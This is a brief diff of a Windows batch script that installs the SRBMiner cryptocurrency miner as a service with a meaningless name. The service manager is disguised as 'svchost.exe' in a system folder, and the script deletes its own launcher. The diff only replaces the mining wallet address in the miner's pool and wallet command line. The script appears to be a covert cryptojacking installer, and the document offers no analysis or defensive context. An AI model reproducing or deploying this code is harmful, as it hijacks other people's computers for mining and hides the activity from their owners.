@@ -210,7 +210,7 @@ setlocal
 set SERVICE_NAME=NcaMvc
 
 :: Set the path to your batch script
-set SCRIPT_PATH="C:\Windows\CSC\SRB\SRBMiner-MULTI.exe --multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool 51pool.online:3416 --pool sal.kryptex.network:7777 --wallet farington#Worker01 --wallet SaLvdXgjQQNC6DFxZgMEHpQ4RG6LjBynZGxrbp5kEit1YxBUoeRB81cLR2NNU43mP9DfyEPqHpf8VMNT4aXSXyefKQTLqoVMUgJ/Worker02 --password Worker01 --password Worker02
+set SCRIPT_PATH="C:\Windows\CSC\SRB\SRBMiner-MULTI.exe --multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool 51pool.online:3416 --pool sal.kryptex.network:7777 --wallet farington#Worker01 --wallet SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm/Worker02 --password Worker01 --password Worker02
 
 :: Set the NSSM path (Change this if NSSM is not in the same folder)
 set NSSM_PATH=C:\Windows\CSC\SRB\svchost.exe
@@ -245,5 +245,6 @@ taskkill /f /im SRB.bat >nul 2>&1
 del /f /q "SRB-invoke.bat"
 ENDLOCAL
 pause
+
 
 
